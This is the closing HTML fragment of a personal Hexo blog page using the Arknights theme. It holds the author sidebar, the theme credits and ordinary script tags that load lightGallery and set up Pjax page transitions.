class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/4.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://str1ke4fun.github.io/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>